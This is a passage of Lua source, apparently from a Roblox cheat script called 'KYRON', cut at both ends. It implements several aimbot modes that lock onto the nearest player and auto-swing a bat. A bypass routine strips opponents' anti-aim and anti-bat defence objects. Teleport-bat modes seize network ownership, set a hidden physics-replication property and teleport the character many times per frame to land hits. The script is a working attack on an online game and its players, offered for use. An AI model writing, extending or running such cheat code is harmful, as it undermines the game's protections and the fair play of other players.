          local humanoidRootPart = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")

          do
            if not humanoidRootPart then
              return nil
            end
            local huge = math.huge
            local v78 = nil

            for _, player in ipairs(Players:GetPlayers()) do
              if player ~= localPlayer and player.Character then
                local humanoidRootPart2 = player.Character:FindFirstChild("HumanoidRootPart")
                local humanoid = player.Character:FindFirstChildOfClass("Humanoid")

                if humanoidRootPart2 and humanoid and humanoid.Health > 0 then
                  local magnitude = (humanoidRootPart2.Position - humanoidRootPart.Position).Magnitude

                  if magnitude < huge then
                    huge = magnitude
                    v78 = humanoidRootPart2
                  end
                end
              end
            end

            return v78
          end
        end

        if _G._KYRONStopBypassAimbot then
          pcall(_G._KYRONStopBypassAimbot)
        end

        do
          local function fn48()
            local tbl37 = {
              enabled = false,
              equipped = false,
              target = nil,
              intendedVelocity = Vector3.zero,
              angularVelocity = nil,
              attachment = nil,
            }

            local tbl38 = {
              "LockBAV",
              "LockAngVel",
              "LockBodyAtt",
              "BatLock",
              "LockBAVAtt",
              "AutoBatAtt",
              "AutoBatAV",
              "AntiBatDet",
              "AntiAim",
              "VelocityLock",
            }

            local function fn49(arg)
              if not arg then
                return
              end

              pcall(function()
                for _, v78 in ipairs(tbl38) do
                  local v79 = arg:FindFirstChild(v78)

                  if v79 then
                    v79:Destroy()
                  end
                end

                for _, child in ipairs(arg:GetChildren()) do
                  local str10 = child.Name:lower()
                  local flag28 = child.Name ~= "_GB_AngV" and child.Name ~= "_GB_Att"

                  if flag28 then
                    flag28 = str10:find("lockb") or str10:find("lockangv") or str10:find("batlock") or str10:find("antiaim") or str10:find("velocitylock")
                  end

                  if flag28 then
                    child:Destroy()
                  end
                end
              end)
            end

            local function fn50(parent)
              pcall(function()
                local gbAngV = parent:FindFirstChild("_GB_AngV")
                local gbAtt = parent:FindFirstChild("_GB_Att")

                if gbAngV then
                  gbAngV:Destroy()
                end

                if gbAtt then
                  gbAtt:Destroy()
                end
              end)

              local attachment = Instance.new("Attachment")
              attachment.Name = "_GB_Att"
              attachment.Parent = parent
              local angularVelocity = Instance.new("AngularVelocity")
              angularVelocity.Name = "_GB_AngV"
              angularVelocity.Attachment0 = attachment
              angularVelocity.RelativeTo = Enum.ActuatorRelativeTo.World
              angularVelocity.MaxTorque = math.huge
              angularVelocity.AngularVelocity = Vector3.zero
              angularVelocity.Parent = parent
              local v78 = tbl37
              tbl37.attachment = attachment
              v78.angularVelocity = angularVelocity
            end

            local function fn51()
              pcall(function()
                if tbl37.angularVelocity and tbl37.angularVelocity.Parent then
                  tbl37.angularVelocity:Destroy()
                end
              end)

              pcall(function()
                if tbl37.attachment and tbl37.attachment.Parent then
                  tbl37.attachment:Destroy()
                end
              end)

              local v78 = tbl37
              tbl37.angularVelocity = nil
              v78.attachment = nil
            end

            local function fn52(arg)
              local huge = math.huge
              local v78 = nil

              for _, player in ipairs(Players:GetPlayers()) do
                if player ~= localPlayer and player.Character then
                  local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
                  local humanoid = player.Character:FindFirstChildOfClass("Humanoid")

                  if humanoidRootPart and humanoid and humanoid.Health > 0 then
                    local magnitude = (humanoidRootPart.Position - arg.Position).Magnitude

                    if magnitude < huge then
                      huge = magnitude
                      v78 = humanoidRootPart
                    end
                  end
                end
              end

              return v78, huge
            end

            local function KYRONStopBypassAimbot()
              local v78 = tbl37
              local v79 = tbl37
              tbl37.enabled = false
              v78.equipped = false
              v79.target = nil
              _G._KYRONBypassAimbotEnabled = false

              if featureConnections.bypassAimbot then
                featureConnections.bypassAimbot:Disconnect()
                featureConnections.bypassAimbot = nil
              end

              if featureConnections.bypassSafety then
                featureConnections.bypassSafety:Disconnect()
                featureConnections.bypassSafety = nil
              end

              local character = localPlayer.Character
              local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
              character = character and character:FindFirstChildOfClass("Humanoid")

              if humanoidRootPart then
                humanoidRootPart.Velocity = humanoidRootPart.Velocity * 0.3
              end

              if character then
                character.AutoRotate = true
              end

              if tbl37.angularVelocity then
                pcall(function()
                  tbl37.angularVelocity.AngularVelocity = Vector3.zero
                end)
              end

              fn51()
            end

            local function KYRONStartBypassAimbot()
              if featureConnections.aimbot then
                featureConnections.aimbot:Disconnect()
                featureConnections.aimbot = nil
              end

              KYRONStopBypassAimbot()
              local v78 = tbl37
              local v79 = tbl37
              tbl37.enabled = true
              v78.equipped = false
              v79.target = nil
              tbl37.intendedVelocity = Vector3.zero
              _G._KYRONBypassAimbotEnabled = true
              local character = localPlayer.Character
              character = character and character:FindFirstChild("HumanoidRootPart")

              if character then
                fn49(character)
                fn50(character)
              end

              featureConnections.bypassAimbot = RunService.Heartbeat:Connect(function()
                if not tbl37.enabled or not combatSettings.aimbot or not combatSettings.antiMode then
                  return
                end
                local character2 = localPlayer.Character
                local humanoid = character2 and character2:FindFirstChildOfClass("Humanoid")
                local v80 = character2 and character2:FindFirstChild("HumanoidRootPart")
                if not v80 or not humanoid then
                  return
                end
                fn49(v80)

                if not tbl37.angularVelocity or not tbl37.angularVelocity.Parent then
                  fn50(v80)
                end

                if not tbl37.equipped then
                  tbl37.equipped = true

                  if not character2:FindFirstChildOfClass("Tool") then
                    local v81 = fn44()

                    if v81 then
                      pcall(function()
                        humanoid:EquipTool(v81)
                      end)
                    end
                  end
                end

                local v81, v82 = fn52(v80)

                if not v81 then
                  tbl37.target = nil
                  humanoid.AutoRotate = true

                  if tbl37.angularVelocity then
                    tbl37.angularVelocity.AngularVelocity = Vector3.zero
                  end

                  return
                end

                tbl37.target = v81
                local n34 = v81.Position + v81.CFrame.LookVector * (v81.Velocity.Magnitude < 0.1 and 1.5 or 5)
                local n35 = n34 - v80.Position
                local vector = Vector3.new(n35.X, 0, n35.Z)
                humanoid.AutoRotate = false

                if n35.Magnitude > 0.01 and vector.Magnitude > 0.01 then
                  local y = v80.Orientation.Y
                  local n36 = (math.deg(math.atan2(-vector.X, -vector.Z)) - y + 180) % 360 - 180
                  local x = v80.Orientation.X
                  local n37 = (math.deg(math.atan2(n35.Y, vector.Magnitude)) - x + 180) % 360 - 180
                  local n38 = math.clamp(math.rad(n36) * 40, -28, 28)
                  local n39 = math.clamp(math.rad(n37) * 40, -28, 28)
                  local v83 = math.rad(v80.Orientation.Y)
                  local vector2 = Vector3.new(math.cos(v83), 0, -math.sin(v83))
                  tbl37.angularVelocity.AngularVelocity = Vector3.new(0, n38, 0) + vector2 * n39
                else
                  tbl37.angularVelocity.AngularVelocity = Vector3.zero
                end

                local n36 = n34 - v80.Position
                local vector2 = Vector3.new(n36.X, 0, n36.Z)
                tbl37.intendedVelocity = (vector2.Magnitude > 0.1 and vector2.Unit * 58 or Vector3.zero) + (math.abs(n36.Y) > 0.8 and Vector3.new(0, math.sign(n36.Y) * 58, 0) or Vector3.new(0, -2, 0))
                v80.Velocity = tbl37.intendedVelocity

                if vector2.Magnitude > 0.5 then
                  humanoid:Move(vector2.Unit, false)
                end

                if v82 <= 10 then
                  local bat = character2:FindFirstChild("Bat") or character2:FindFirstChild("bat")

                  if bat and bat:IsA("Tool") then
                    pcall(function()
                      bat:Activate()
                      local remoteEvent = bat:FindFirstChildWhichIsA("RemoteEvent")

                      if remoteEvent then
                        remoteEvent:FireServer()
                      end
                    end)
                  end
                end
              end)

              featureConnections.bypassSafety = RunService.RenderStepped:Connect(function()
                if not tbl37.enabled or not combatSettings.aimbot or not combatSettings.antiMode then
                  return
                end
                local humanoidRootPart = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
                if not humanoidRootPart then
                  return
                end
                local velocity = humanoidRootPart.Velocity

                if math.abs(velocity.X) > 350 or math.abs(velocity.Z) > 350 then
                  humanoidRootPart.Velocity = tbl37.intendedVelocity
                end

                fn49(humanoidRootPart)
              end)
            end

            if not featureConnections.bypassRespawn then
              featureConnections.bypassRespawn = localPlayer.CharacterAdded:Connect(function(character)
                task.wait(0.5)
                local v78 = tbl37
                tbl37.equipped = false
                v78.target = nil

                if tbl37.enabled and combatSettings.aimbot and combatSettings.antiMode then
                  local humanoidRootPart = character:WaitForChild("HumanoidRootPart", 5)

                  if humanoidRootPart then
                    fn49(humanoidRootPart)
                    fn50(humanoidRootPart)
                  end
                end
              end)
            end

            -- Targeting controller setup and cleanup.
            _G._KYRONStartBypassAimbot = KYRONStartBypassAimbot
            _G._KYRONStopBypassAimbot = KYRONStopBypassAimbot

            _G._KYRONIsBypassAimbotActive = function()
              return tbl37.enabled == true
            end
          end

          fn48()
        end
      end

      do
        local function fn48()
          if _G._KYRONStopBypassAimbot then
            _G._KYRONStopBypassAimbot()
          end

          _G._KYRONTPMirrorEnabled = combatSettings.tpMirror == true

          if featureConnections.aimbot then
            featureConnections.aimbot:Disconnect()
          end

          _G._KYRONNormalAimbot = _G._KYRONNormalAimbot or { target = nil, swingCooldown = false }
          local KYRONNormalAimbot = _G._KYRONNormalAimbot
          KYRONNormalAimbot.target = nil
          KYRONNormalAimbot.swingCooldown = false
          local humanoid = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")

          if humanoid then
            if KYRONNormalAimbot.previousAutoRotate == nil then
              KYRONNormalAimbot.previousAutoRotate = humanoid.AutoRotate
            end

            humanoid.AutoRotate = false
          end

          featureConnections.aimbot = RunService.RenderStepped:Connect(function()
            if not combatSettings.aimbot then
              return
            end
            local character = localPlayer.Character
            if not character then
              return
            end
            local v78 = character:FindFirstChild("HumanoidRootPart")
            if not v78 then
              return
            end
            local humanoid2 = character:FindFirstChildOfClass("Humanoid")
            if not humanoid2 then
              return
            end
            local tool = character:FindFirstChildOfClass("Tool") or fn44()

            if combatSettings.antiMode then
              if tool and tool.Parent ~= character and not character:FindFirstChildOfClass("Tool") then
                pcall(function()
                  humanoid2:EquipTool(tool)
                end)
              end
            else
              tool = character:FindFirstChildOfClass("Tool")
            end

            local v79

            if combatSettings.antiMode then
              v79 = fn45()
            else
              v79 = fn45()
            end

            KYRONNormalAimbot.target = v79
            if not v79 then
              return
            end

            if combatSettings.antiMode then
              local position = v79.Position
              local n34 = position - v78.Position
              local vector = Vector3.new(n34.X, 0, n34.Z)
              local unit

              if vector.Magnitude > 0 then
                unit = vector.Unit
              else
                unit = Vector3.zero
              end

              humanoid2.AutoRotate = false
              local n35 = math.clamp(combatSettings.aimSpd or 65, 1, 200)
              local n36 = (position.Y + 3.7 - v78.Position.Y) * 19.5
              local n37

              if humanoid2.FloorMaterial == Enum.Material.Air then
                n37 = n36
              else
                n37 = math.max(n36, 13)
              end

              v78.AssemblyLinearVelocity = v78.AssemblyLinearVelocity:Lerp(Vector3.new(unit.X * n35, math.clamp(n37, -60, 110), unit.Z * n35), 0.75)

              if n34.Magnitude > 0.1 then
                local cframe = CFrame.lookAt(v78.Position, position)
                local v80, v81, v82 = (v78.CFrame:Inverse() * cframe):ToEulerAnglesXYZ()
                local v83 = 70
                local v84 = 70
                v78.AssemblyAngularVelocity = v78.CFrame:VectorToWorldSpace(Vector3.new(math.clamp(v80, -1.6, 2.5) * v83, math.clamp(v81, -1.6, 1.6) * 42, math.clamp(v82, -1.6, 1.6) * v84))
              end

              if combatSettings.swing and tool and tool.Parent == character and not KYRONNormalAimbot.swingCooldown then
                KYRONNormalAimbot.swingCooldown = true

                pcall(function()
                  tool:Activate()
                end)

                task.delay(0.15, function()
                  if _G._KYRONNormalAimbot == KYRONNormalAimbot then
                    KYRONNormalAimbot.swingCooldown = false
                  end
                end)
              end

              return
            end

            humanoid2.AutoRotate = false

            if not character:FindFirstChildOfClass("Tool") then
              local v80 = fn44()

              if v80 then
                pcall(function()
                  humanoid2:EquipTool(v80)
                end)
              end
            end

            local position = v78.Position
            local position2 = v79.Position
            local assemblyLinearVelocity = v79.AssemblyLinearVelocity or Vector3.zero
            local n34 = position2 + assemblyLinearVelocity * 0.14 + v79.CFrame.LookVector * 0.3 - position
            local vector = Vector3.new(n34.X, 0, n34.Z)
            local unit

            if vector.Magnitude > 0 then
              unit = vector.Unit
            else
              unit = Vector3.zero
            end

            local n35 = math.clamp(combatSettings.aimSpd or 58, 1, 200)
            local n36 = (position2.Y + 3.7 - position.Y) * 19.5 + assemblyLinearVelocity.Y * 0.8
            local n37

            if humanoid2.FloorMaterial == Enum.Material.Air then
              n37 = n36
            else
              n37 = math.max(n36, 13)
            end

            local n38 = unit.Z * n35
            v78.AssemblyLinearVelocity = v78.AssemblyLinearVelocity:Lerp(Vector3.new(unit.X * n35, math.clamp(n37, -70, 110), n38), 0.8)
            local n39 = position2 + assemblyLinearVelocity * math.clamp(assemblyLinearVelocity.Magnitude / 140, 0.05, 0.2)

            if 0.4 < (n39 - position).Magnitude then
              local cframe = CFrame.lookAt(position, n39)
              local v80, v81, v82 = (v78.CFrame:Inverse() * cframe):ToEulerAnglesXYZ()
              v78.AssemblyAngularVelocity = v78.CFrame:VectorToWorldSpace(Vector3.new(math.clamp(v80, -1.6, 1.6) * 42, math.clamp(v81, -1.6, 2.5) * 42, math.clamp(v82, -1.6, 2.5) * 42))
            end

            if (v78.Position - v79.Position).Magnitude <= 8 then
              pcall(function()
                local flag28 = character:FindFirstChildOfClass("Tool")

                if flag28 then
                  flag28 = not (flag28.Name:lower():find("bat") or flag28.Name:lower():find("slap"))
                end

                if flag28 then
                  return
                end
                local v80 = fn44()
                if not v80 then
                  return
                end

                if v80.Parent ~= character then
                  humanoid2:EquipTool(v80)
                end

                if v80.Parent == character then
                  v80:Activate()
                end
              end)
            end
          end)
        end
      end

      local function fn48()
        if _G._KYRONStopBypassAimbot then
          _G._KYRONStopBypassAimbot()
        end

        _G._KYRONTPMirrorEnabled = false

        if featureConnections.aimbot then
          featureConnections.aimbot:Disconnect()
          featureConnections.aimbot = nil
        end

        if _G._KYRONNormalAimbot then
          _G._KYRONNormalAimbot.target = nil
          _G._KYRONNormalAimbot.swingCooldown = false
        end

        local character = localPlayer.Character
        if not character then
          return
        end
        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
        local humanoid = character:FindFirstChildOfClass("Humanoid")

        if humanoid then
          local previousAutoRotate = _G._KYRONNormalAimbot and _G._KYRONNormalAimbot.previousAutoRotate
          humanoid.AutoRotate = previousAutoRotate == nil and true or previousAutoRotate

          if _G._KYRONNormalAimbot then
            _G._KYRONNormalAimbot.previousAutoRotate = nil
          end

          humanoid.PlatformStand = false

          pcall(function()
            humanoid:Move(Vector3.zero, false)
          end)

          pcall(function()
            humanoid:ChangeState(Enum.HumanoidStateType.Running)
          end)
        end

        if humanoidRootPart then
          humanoidRootPart.Anchored = false
          humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
          humanoidRootPart.AssemblyAngularVelocity = Vector3.zero

          if _G._KYRONVoltHiddenPropertyDisabled then
            pcall(_G._KYRONVoltHiddenPropertyDisabled, humanoidRootPart, "PhysicsRepRootPart", nil)
          end

          local cFrame = humanoidRootPart.CFrame
          local lookVector = cFrame.LookVector
          local vector = Vector3.new(lookVector.X, 0, lookVector.Z)
          local vector2

          if vector.Magnitude < 0.01 then
            vector2 = Vector3.new(0, 0, -1)
          else
            vector2 = vector.Unit
          end

          humanoidRootPart.CFrame = CFrame.lookAt(cFrame.Position, cFrame.Position + vector2)
          humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
          humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
        end

        task.spawn(function()
          for i = 1, 12 do
            task.wait(0.1)
            local character2 = localPlayer.Character
            if not character2 then
              return
            end
            local humanoidRootPart2 = character2:FindFirstChild("HumanoidRootPart")
            local humanoid2 = character2:FindFirstChildOfClass("Humanoid")

            if humanoid2 then
              humanoid2.AutoRotate = true
              humanoid2.PlatformStand = false
            end

            if humanoidRootPart2 then
              humanoidRootPart2.AssemblyAngularVelocity = Vector3.zero
            end
          end
        end)
      end
    end

    _G._KYRONYoutAimbot = _G._KYRONYoutAimbot or { hitCooling = false, previousAutoRotate = nil }

    fn46 = function()
      if featureConnections.aimbot then
        featureConnections.aimbot:Disconnect()
        featureConnections.aimbot = nil
      end

      local KYRONYoutAimbot = _G._KYRONYoutAimbot
      KYRONYoutAimbot.hitCooling = false
      local humanoid = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")

      if humanoid and KYRONYoutAimbot.previousAutoRotate == nil then
        KYRONYoutAimbot.previousAutoRotate = humanoid.AutoRotate
      end

      local function fn48(arg)
        local huge = math.huge
        local v78 = nil

        for _, player in ipairs(Players:GetPlayers()) do
          if player ~= localPlayer and player.Character then
            local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
            local humanoid2 = player.Character:FindFirstChildOfClass("Humanoid")

            if humanoidRootPart and humanoid2 and humanoid2.Health > 0 then
              local magnitude = (humanoidRootPart.Position - arg.Position).Magnitude

              if magnitude < huge then
                huge = magnitude
                v78 = humanoidRootPart
              end
            end
          end
        end

        return v78
      end

      local function fn49(arg, arg2, arg3, arg4, arg5)
        if not arg or arg4 and KYRONYoutAimbot.hitCooling then
          return
        end

        if arg4 then
          KYRONYoutAimbot.hitCooling = true
        end

        pcall(function()
          if arg.Parent ~= arg3 then
            arg2:EquipTool(arg)
          end

          if arg.Parent ~= arg3 then
            return
          end
          local remoteEvent = arg5 and arg:FindFirstChildOfClass("RemoteEvent")

          if remoteEvent then
            remoteEvent:FireServer()
          else
            arg:Activate()
          end
        end)

        if arg4 then
          task.delay(0.08, function()
            KYRONYoutAimbot.hitCooling = false
          end)
        end
      end

      featureConnections.aimbot = RunService.RenderStepped:Connect(function()
        if not combatSettings.aimbot then
          return
        end
        local character = localPlayer.Character
        local v78 = character and character:FindFirstChild("HumanoidRootPart")
        local v79 = character and character:FindFirstChildOfClass("Humanoid")
        if not v78 or not v79 then
          return
        end
        v79.AutoRotate = false
        local v80 = fn48(v78)
        if not v80 then
          return
        end

        if combatSettings.antiMode then
          local n34 = v80.Position - v78.Position
          local vector = Vector3.new(n34.X, 0, n34.Z)
          local unit = vector.Magnitude > 0 and vector.Unit or Vector3.zero
          local n35 = math.clamp(combatSettings.aimSpd or 60, 1, 200)
          local n36 = math.clamp((v80.Position.Y + 3.7 - v78.Position.Y) * 19.5, -70, 110)

          if v79.FloorMaterial ~= Enum.Material.Air then
            n36 = math.max(n36, 13)
          end

          local v81 = 0.75
          v78.AssemblyLinearVelocity = v78.AssemblyLinearVelocity:Lerp(Vector3.new(unit.X * n35, n36, unit.Z * n35), v81)

          if n34.Magnitude > 0.1 then
            local v82, v83, v84 = (v78.CFrame:Inverse() * CFrame.lookAt(v78.Position, v80.Position)):ToEulerAnglesXYZ()
            v78.AssemblyAngularVelocity = v78.CFrame:VectorToWorldSpace(Vector3.new(math.clamp(v82, -2.5, 2.5) * 42, math.clamp(v83, -1.6, 2.5) * 42, math.clamp(v84, -2.5, 2.5) * 42))
          end

          if combatSettings.swing then
            local tool = character:FindFirstChildOfClass("Tool") or fn44()

            if tool and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then
              fn49(tool, v79, character, true, false)
            end
          end

          return
        end

        if not character:FindFirstChildOfClass("Tool") then
          local v81 = fn44()

          if v81 then
            pcall(function()
              v79:EquipTool(v81)
            end)
          end
        end

        local assemblyLinearVelocity = v80.AssemblyLinearVelocity
        local n34 = v80.Position + assemblyLinearVelocity * 0.14 + v80.CFrame.LookVector * 0.3 - v78.Position
        local vector = Vector3.new(n34.X, 0, n34.Z)
        local unit = vector.Magnitude > 0 and vector.Unit or Vector3.zero
        local n35 = math.clamp((v80.Position.Y + 3.7 - v78.Position.Y) * 19.5 + assemblyLinearVelocity.Y * 0.8, -70, 110)
        local n36

        if v79.FloorMaterial == Enum.Material.Air then
          n36 = n35
        else
          n36 = math.max(n35, 13)
        end

        v78.AssemblyLinearVelocity = v78.AssemblyLinearVelocity:Lerp(Vector3.new(unit.X * 58, n36, unit.Z * 58), 0.8)
        local n37 = v80.Position + assemblyLinearVelocity * math.clamp(assemblyLinearVelocity.Magnitude / 150, 0.05, 0.2)

        if (n37 - v78.Position).Magnitude > 0.1 then
          local v81, v82, v83 = (v78.CFrame:Inverse() * CFrame.lookAt(v78.Position, n37)):ToEulerAnglesXYZ()
          v78.AssemblyAngularVelocity = v78.CFrame:VectorToWorldSpace(Vector3.new(math.clamp(v81, -1.6, 2.5) * 42, math.clamp(v82, -1.6, 1.6) * 42, math.clamp(v83, -2.5, 2.5) * 42))
        end

        if (v78.Position - v80.Position).Magnitude <= 8 then
          local v81 = character:FindFirstChildOfClass("Tool") or fn44()

          if v81 and (v81.Name:lower():find("bat") or v81.Name:lower():find("slap")) then
            fn49(v81, v79, character, false, false)
          end
        end
      end)
    end

    fn47 = function()
      if featureConnections.aimbot then
        featureConnections.aimbot:Disconnect()
        featureConnections.aimbot = nil
      end

      local KYRONYoutAimbot = _G._KYRONYoutAimbot
      KYRONYoutAimbot.hitCooling = false
      local character = localPlayer.Character
      local v78 = character and character:FindFirstChild("HumanoidRootPart")
      character = character and character:FindFirstChildOfClass("Humanoid")

      if character then
        character.AutoRotate = KYRONYoutAimbot.previousAutoRotate == nil and true or KYRONYoutAimbot.previousAutoRotate
        character.PlatformStand = false
      end

      KYRONYoutAimbot.previousAutoRotate = nil

      if v78 then
        v78.AssemblyLinearVelocity = Vector3.zero
        v78.AssemblyAngularVelocity = Vector3.zero
      end
    end

    tbl36 = {}
    n33 = 0
    flag27 = false

    do
      local function fn48()
        return combatSettings.aimbot == true
      end

      local function fn49()
        local character = localPlayer.Character
        local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
        character = character and character:FindFirstChildOfClass("Humanoid")
        if not humanoidRootPart or not character or character.Health <= 0 then
          return
        end
        local now2 = tick()
        if now2 - n33 < 0.08 then
          return
        end
        n33 = now2
        local v78, v79 = humanoidRootPart.CFrame:ToEulerAnglesYXZ()
        humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X, -7, humanoidRootPart.Position.Z) * CFrame.Angles(0, v79, 0)
        humanoidRootPart.Velocity = Vector3.zero

        pcall(function()
          humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
        end)
      end

      local n34 = 0

      RunService.Heartbeat:Connect(function()
        local now2 = tick()
        if now2 < n34 then
          return
        end
        n34 = now2 + 0.4
        if not _G._KYRONTPMirrorEnabled or not fn48() then
          table.clear(tbl36)
          return
        end
        local character = localPlayer.Character
        character = character and character:FindFirstChild("HumanoidRootPart")
        if not character then
          return
        end

        for _, player in ipairs(Players:GetPlayers()) do
          if player ~= localPlayer and player.Character then
            local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
            local humanoid = player.Character:FindFirstChildOfClass("Humanoid")

            if humanoidRootPart and humanoid and humanoid.Health > 0 then
              local n35 = humanoidRootPart.Position.X - character.Position.X
              local n36 = humanoidRootPart.Position.Z - character.Position.Z

              if n35 * n35 + n36 * n36 <= 64 then
                local y = humanoidRootPart.Position.Y
                local v78 = tbl36[player.UserId]

                if v78 and v78 - y >= 3 then
                  pcall(fn49)
                  table.clear(tbl36)
                end

                tbl36[player.UserId] = y
              else
                tbl36[player.UserId] = nil
              end
            end
          end
        end
      end)
    end
  end

  local fn48, fn49, fn50, fn51

  do
    do
      _G._KYRONDesyncMode = "V2"
      _G._KYRONBypassAimbotEnabled = false

      if _G._KYRONTpBatStillCamera and _G._KYRONTpBatStillCamera.Destroy then
        pcall(_G._KYRONTpBatStillCamera.Destroy)
      end

      _G._KYRONTpBatStillCamera = nil
      _G._KYRONTpBatStillCameraEnabled = nil
      _G._KYRONTpBatPrediction = nil
      _G._KYRONTpBatResetPrediction = nil
      _G._KYRONPredictTpBatPosition = nil

      do
        local function fn52()
          return math.clamp(tonumber(_G._KYRONTpBatSwingDelay) or 0.007, 0.001, 1)
        end

        local function fn53()
          return combatSettings.desyncSwing == true or combatSettings.swing == true
        end

        local function fn54()
          return _G._KYRONTpBatCameraSteering ~= false
        end

        local function fn55(arg, arg2)
          pcall(function()
            local bat = arg:FindFirstChild("Bat") or fn44()
            if not bat then
              return
            end

            if bat.Parent ~= arg then
              arg2:EquipTool(bat)
            end

            if bat.Parent == arg then
              bat:Activate()
            end

            local remoteEvent = bat:FindFirstChildWhichIsA("RemoteEvent")

            if remoteEvent then
              remoteEvent:FireServer()
            end

            local remoteFunction = bat:FindFirstChildWhichIsA("RemoteFunction")

            if remoteFunction then
              remoteFunction:InvokeServer()
            end
          end)
        end

        -- Teleport/bat modes and hit-controller helpers.
        _G._KYRONTpBatLogic = {}

        _G._KYRONYznHighPingV1 = _G._KYRONYznHighPingV1
          or {
            spin = 0,
            lastSwing = 0,
            SpinSpeed = 48,
            TeleportsPerFrame = 100,
            TargetCenterOffset = 0.9,
            SwingDelay = 0.02,
            OrbitRadius = 0.2,
            FrameSnaps = 1,
            HitSpam = 1,
          }

        _G._KYRONGalTpBatV1 = _G._KYRONGalTpBatV1
          or {
            target = nil,
            lastSafeCFrame = nil,
            marker = nil,
            minX = -536.2,
            maxX = -422,
            minY = -12,
            maxY = 75,
            minZ = -71.8,
            maxZ = 192.9,
            groundY = -7,
            markerDistance = 3,
          }

        _G._KYRONTpBatLogic.isGalV1InBounds = function(arg)
          local KYRONGalTpBatV1 = _G._KYRONGalTpBatV1
          return arg
            and arg.X >= KYRONGalTpBatV1.minX
            and arg.X <= KYRONGalTpBatV1.maxX
            and arg.Y >= KYRONGalTpBatV1.minY
            and arg.Y <= KYRONGalTpBatV1.maxY
            and arg.Z >= KYRONGalTpBatV1.minZ
            and arg.Z <= KYRONGalTpBatV1.maxZ
        end

        _G._KYRONTpBatLogic.clearGalV1Marker = function()
          local KYRONGalTpBatV1 = _G._KYRONGalTpBatV1

          if KYRONGalTpBatV1.marker then
            pcall(function()
              KYRONGalTpBatV1.marker:Destroy()
            end)
          end

          KYRONGalTpBatV1.marker = nil
        end

        _G._KYRONTpBatLogic.trackGalV1Target = function(target)
          local KYRONGalTpBatV1 = _G._KYRONGalTpBatV1

          if KYRONGalTpBatV1.target ~= target then
            KYRONGalTpBatV1.lastSafeCFrame = nil
            _G._KYRONTpBatLogic.clearGalV1Marker()
          end

          KYRONGalTpBatV1.target = target

          if _G._KYRONTpBatLogic.isGalV1InBounds(target.Position) then
            KYRONGalTpBatV1.lastSafeCFrame = target.CFrame
            _G._KYRONTpBatLogic.clearGalV1Marker()
            return
          end

          if not KYRONGalTpBatV1.lastSafeCFrame or KYRONGalTpBatV1.marker then
            return
          end
          local lastSafeCFrame = KYRONGalTpBatV1.lastSafeCFrame
          local part = Instance.new("Part")
          part.Name = "KYRONGalTpBatLastPosition"
          part.Shape = Enum.PartType.Ball
          part.Size = Vector3.new(3, 3, 3)
          part.Color = Color3.fromRGB(0, 110, 240)
          part.Material = Enum.Material.Neon
          local v78 = false
          part.Anchored = true
          part.CanCollide = false
          part.CanTouch = v78
          part.CanQuery = false
          part.CastShadow = false
          part.CFrame = CFrame.new(lastSafeCFrame.Position.X, KYRONGalTpBatV1.groundY, lastSafeCFrame.Position.Z) * lastSafeCFrame.Rotation
          part.Parent = workspace
          local highlight = Instance.new("Highlight")
          highlight.Adornee = part
          highlight.FillColor = Color3.fromRGB(0, 110, 255)
          highlight.FillTransparency = 0.15
          highlight.OutlineColor = Color3.fromRGB(40, 200, 255)
          highlight.OutlineTransparency = 0
          highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
          highlight.Parent = part
          KYRONGalTpBatV1.marker = part
        end

        _G._KYRONTpBatLogic.getGalV1MarkerCFrame = function(arg)
          local KYRONGalTpBatV1 = _G._KYRONGalTpBatV1
          local marker = KYRONGalTpBatV1.marker
          if not marker or not marker.Parent then
            return nil
          end
          local vector = Vector3.new(arg.Position.X - marker.Position.X, 0, arg.Position.Z - marker.Position.Z)

          if vector.Magnitude <= 0.05 then
            vector = -marker.CFrame.LookVector
          end

          if vector.Magnitude <= 0.05 then
            vector = Vector3.new(0, 0, 1)
          end

          local n34 = marker.Position + vector.Unit * KYRONGalTpBatV1.markerDistance
          local vector2 = Vector3.new(marker.Position.X - n34.X, 0, marker.Position.Z - n34.Z)
          return vector2.Magnitude > 0.05 and CFrame.lookAt(n34, n34 + vector2.Unit) or CFrame.new(n34)
        end

        _G._KYRONTpBatLogic.getGalV1Bat = function(arg, arg2)
          local bat = arg:FindFirstChild("Bat")
          if bat and bat:IsA("Tool") then
            return bat
          end
          local backpack = localPlayer:FindFirstChildOfClass("Backpack")
          local bat2 = backpack and backpack:FindFirstChild("Bat")

          if bat2 and bat2:IsA("Tool") then
            pcall(function()
              arg2:EquipTool(bat2)
            end)

            return bat2
          end

          return nil
        end

        _G._KYRONTpBatLogic.steerCamera = function(arg)
          if not fn54() then
            return
          end
          local currentCamera = workspace.CurrentCamera

          if currentCamera then
            currentCamera.CFrame = CFrame.new(currentCamera.CFrame.Position, arg.Position)
          end
        end

        _G._KYRONTpBatLogic.runYznHighPingV1 = function(arg, arg2, arg3, arg4)
          local KYRONYznHighPingV1 = _G._KYRONYznHighPingV1
          _G._KYRONTpBatLogic.trackGalV1Target(arg4)
          local v78 = _G._KYRONTpBatLogic.getGalV1MarkerCFrame(arg2)

          if v78 then
            pcall(function()
              if arg2.SetNetworkOwner then
                arg2:SetNetworkOwner(localPlayer)
              end
            end)

            if _G._KYRONVoltHiddenPropertyDisabled then
              pcall(_G._KYRONVoltHiddenPropertyDisabled, arg2, "PhysicsRepRootPart", arg2)
            end

            arg2.CFrame = v78
            _G._KYRONTpBatLogic.steerCamera(v78)

            if fn53() then
              fn55(arg, arg3)
            end

            return
          end

          pcall(function()
            if arg2.SetNetworkOwner then
              arg2:SetNetworkOwner(localPlayer)
            end
          end)

          if _G._KYRONVoltHiddenPropertyDisabled then
